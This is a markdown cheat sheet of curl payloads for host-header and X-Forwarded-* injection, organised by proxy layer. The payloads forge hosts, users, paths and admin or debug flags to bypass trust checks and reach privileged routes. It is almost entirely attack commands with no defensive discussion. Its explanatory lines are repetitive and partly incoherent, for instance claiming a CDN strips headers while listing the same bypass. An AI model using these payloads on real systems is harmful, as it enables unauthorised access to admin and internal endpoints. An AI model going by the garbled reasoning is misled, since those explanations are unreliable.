# Per-proxy — every proxy the host header crosses, exhaustively

The proxy map — a proxy, the host-header check it gates.

---

## 1. The CDN / reverse-proxy boundary — a stripped header

```text
a CDN strips the proxy's own headers — `X-Forwarded-Host`, `X-Forwarded-Proto`,
`X-Forwarded-Server` — before the origin sees them. The origin's missing-header
fallback treats the request as local → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the CDN strips it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the CDN strips it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the CDN strips it
```

## 2. The internal reverse-proxy boundary — a forwarded header

```text
an internal reverse-proxy forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the proxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the proxy forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the proxy forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the proxy forwards it
```

## 3. The load-balancer boundary — a forwarded header

```text
a load-balancer forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the load-balancer forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the load-balancer forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the load-balancer forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the load-balancer forwards it
```

## 4. The API-gateway boundary — a forwarded header

```text
an API-gateway forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the API-gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the API-gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the API-gateway forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the API-gateway forwards it
```

## 5. The edge-router boundary — a forwarded header

```text
an edge-router forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge-router forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the edge-router forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the edge-router forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the edge-router forwards it
```

## 6. The middleware boundary — a forwarded header

```text
a middleware forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the middleware forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the middleware forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the middleware forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the middleware forwards it
```

## 7. The application boundary — a forwarded header

```text
an application forwards the proxy's own headers — `X-Forwarded-Host`,
`X-Forwarded-Proto`, `X-Forwarded-Server` — to the origin. The origin trusts
them → a trust-check bypass.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the application forwards it
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # the application forwards it
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # the application forwards it
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # the application forwards it
```

## 8. The chained-proxy boundary — a chained normalization

```text
a multi-proxy chain — a header each strips differently — a chained
normalization boundary — a per-layer differential.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a chained path differential
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a chained prefix differential
```

## 9. The duplicated Host boundary — a parsing differential

```text
a duplicated Host — the proxy reads the first; the app reads the second → a
differential.
```

```bash
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: target.com' "$BASE/"
curl -s -D - -H 'Host: target.com' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: internal' "$BASE/"
curl -s -D - -H 'Host: internal' -H 'Host: good.example' "$BASE/"
```

## 10. The malformed Host boundary — a parsing edge

```text
a malformed Host — a parsing edge → a differential.
```

```bash
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example:443' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example:8080' "$BASE/"   # a forged port
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: evil.example..internal' "$BASE/"   # a double-dot
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host
curl -s -D - -H 'Host:  ' "$BASE/"   # a whitespace host
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator
curl -s -D - -H 'Host: evil.example/target.com' "$BASE/"   # a path separator
curl -s -D - -H 'Host: target.com/evil.example' "$BASE/"   # a path separator
curl -s -D - -H 'Host: evil.example\\target.com' "$BASE/"   # a backslash separator
curl -s -D - -H 'Host: target.com\\evil.example' "$BASE/"   # a backslash separator
```

## 11. The absolute-URI boundary — a request-line differential

```text
an absolute-URI Host — a request-line differential — the proxy reads the Host
header; the app reads the absolute-URI → a differential.
```

```bash
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://internal/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://localhost/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://127.0.0.1/'   # an absolute-URI
```

## 12. The multi-header boundary — a combined injection

```text
a multi-header bypass — a combined injection — a forged host + a forged flag —
a local + an internal check → a privileged route reached.
```

```bash
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
```
